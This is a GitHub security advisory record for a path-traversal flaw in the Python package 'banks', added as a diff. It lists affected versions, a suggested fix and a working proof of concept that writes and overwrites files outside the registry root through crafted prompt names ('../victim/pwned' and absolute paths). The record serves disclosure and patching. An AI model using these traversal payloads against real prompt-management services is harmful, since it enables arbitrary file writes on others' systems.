@@ -1,0 +1,98 @@
+{
+  "id": "GHSA-x8wg-4xgc-vr54",
+  "modified": "2026-09-02T14:45:05.158947914Z",
+  "published": "2026-09-02T14:38:24Z",
+  "aliases": [
+    "CVE-2026-71492"
+  ],
+  "summary": "Banks: Path traversal in `DirectoryPromptRegistry.set()` allows arbitrary file write outside the registry root",
+  "details": "## Summary\n\n`DirectoryPromptRegistry.set()` interpolates the attacker-controllable `Prompt.name` into a `Path` expression with no canonicalization. An application that derives the prompt name from request data lets a caller write attacker-controlled bytes outside the configured registry directory.\n\n## Details\n\n`src/banks/registries/directory.py:44`\n\n```python\nprompt_file = path / f\"{prompt.name}.{prompt.version}.jinja\"\nprompt_file.write_text(prompt.raw)\n```\n\nTwo failure modes:\n\n1. **Relative traversal.** `name=\"../victim/foo\"` resolves to `\u003cregistry\u003e/../victim/foo.0.jinja` — outside the configured root.\n2. **Absolute-path bypass.** `pathlib` documents that `Path(\"/a\") / Path(\"/b\")` returns `Path(\"/b\")`. So `name=\"/abs/path\"` discards the registry root entirely; the registry is never consulted.\n\nThe poisoned `name` is then persisted to `index.json`, so the out-of-root path keeps reconstructing on later `_load()` calls (`directory.py:135-141`). With `overwrite=True`, existing files at the target path are replaced.\n\n## Proof of Concept\n\n```python\nimport tempfile\nfrom pathlib import Path\nfrom banks import Prompt\nfrom banks.registries import DirectoryPromptRegistry\n\nwork = Path(tempfile.mkdtemp())\nregistry = work / \"registry\"; registry.mkdir()\nvictim   = work / \"victim\";   victim.mkdir()\n\nreg = DirectoryPromptRegistry(str(registry))\n\n# (1) Relative traversal\nreg.set(prompt=Prompt(\"pwn\", name=\"../victim/pwned\", version=\"0\"))\nprint((victim / \"pwned.0.jinja\").read_text())            # 'pwn'\n\n# (2) Absolute-path bypass — registry root is silently discarded\ntarget = victim / \"absolute_pwn\"\nreg.set(prompt=Prompt(\"abs pwn\", name=str(target), version=\"0\"))\nprint((victim / \"absolute_pwn.0.jinja\").read_text())     # 'abs pwn'\n\n# (3) Clobber an existing file\nexisting = victim / \"clobber_me\"\nexisting.write_text(\"ORIGINAL\\n\")\nreg.set(prompt=Prompt(\"CLOBBERED\", name=str(existing), version=\"0\"),\n        overwrite=True)\nprint((victim / \"clobber_me.0.jinja\").read_text())       # 'CLOBBERED'\n```\n\n**Output (verified on `banks==2.4.2`):**\n\n```\npwn\nabs pwn\nCLOBBERED\n```\n\n[test_sandbox_baseline.py](https://github.com/user-attachments/files/27572665/test_sandbox_baseline.py)\n\n\u003cimg width=\"793\" height=\"149\" alt=\"Screenshot 2026-05-10 at 3 19 49 PM\" src=\"https://github.com/user-attachments/assets/5c8a79ba-eaf8-4425-8612-4414bc34a0d6\" /\u003e\n\n[registry_path_traversal.py](https://github.com/user-attachments/files/27572619/registry_path_traversal.py)\n\n\u003cimg width=\"893\" height=\"221\" alt=\"Screenshot 2026-05-10 at 3 20 02 PM\" src=\"https://github.com/user-attachments/assets/8aceca27-5df1-4b59-9a77-502698da6e65\" /\u003e\n\n\n[registry_path_traversal_v2.py](https://github.com/user-attachments/files/27572620/registry_path_traversal_v2.py)\n\n\u003cimg width=\"1036\" height=\"272\" alt=\"Screenshot 2026-05-10 at 3 20 18 PM\" src=\"https://github.com/user-attachments/assets/aaceec31-f9a8-432f-b013-29694dd22478\" /\u003e\n\n\n**Negative control:** with a benign `name=\"okay-name\"`, the file lands inside `\u003cregistry\u003e/` and the victim directory remains untouched.\n\n## Impact\n\nArbitrary file write at an attacker-chosen path with attacker-controlled bytes, scoped to whatever the application process can write to. The `.0.jinja` suffix limits some chains, but does not prevent overwriting templates consumed by the same or another application, planting files that other tooling ingests, or clobbering predictable-path config artifacts.\n\nRealistic threat model: any \"prompt management\" service that exposes prompt creation through an authenticated API and forwards user-supplied `name` (and `version`) to `Prompt(...)` plus `DirectoryPromptRegistry.set()`.\n\n## Suggested Fix\n\nReject obviously dangerous names early and verify the resulting path stays under the registry root after canonicalization:\n\n```python\n# src/banks/registries/directory.py\nimport re\n\n_NAME_RE = re.compile(r\"[A-Za-z0-9._-]+\")\n\n@classmethod\ndef from_prompt_path(cls, prompt, path):\n    if not _NAME_RE.fullmatch(prompt.name or \"\"):\n        raise InvalidPromptError(f\"Invalid prompt name: {prompt.name!r}\")\n    if not _NAME_RE.fullmatch(prompt.version or \"\"):\n        raise InvalidPromptError(f\"Invalid prompt version: {prompt.version!r}\")\n\n    candidate = (path / f\"{prompt.name}.{prompt.version}.jinja\").resolve()\n    if candidate.parent != path.resolve():\n        raise InvalidPromptError(\n            f\"Prompt path escapes registry root: {candidate}\"\n        )\n\n    candidate.write_text(prompt.raw)\n    return cls(\n        text=prompt.raw, name=prompt.name, version=prompt.version,\n        metadata=prompt.metadata, path=candidate,\n    )\n```\n\nThe same enforcement should run inside `_load()` and `_get_prompt_file()` so a poisoned `index.json` from a vulnerable run cannot keep escaping after upgrade.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "banks",
+        "purl": "pkg:pypi/banks"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.4.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.1.0",
+        "0.1.1",
+        "0.2.0",
+        "0.3.0",
+        "0.3.1",
+        "0.4.1",
+        "0.5.0",
+        "0.6.0",
+        "1.0.0",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.4.0",
+        "1.5.0",
+        "1.6.0",
+        "1.6.1",
+        "1.7.0",
+        "1.7.1",
+        "1.8.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.1.3",
+        "2.2.0",
+        "2.3.0",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.4.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-x8wg-4xgc-vr54/GHSA-x8wg-4xgc-vr54.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/masci/banks/security/advisories/GHSA-x8wg-4xgc-vr54"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-71492"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/masci/banks/pull/77"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/masci/banks/commit/a215f6d779966945c56e0af5abed1ae5916fd9d3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/masci/banks"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/masci/banks/releases/tag/v2.4.5"
+    }
+  ]
+}
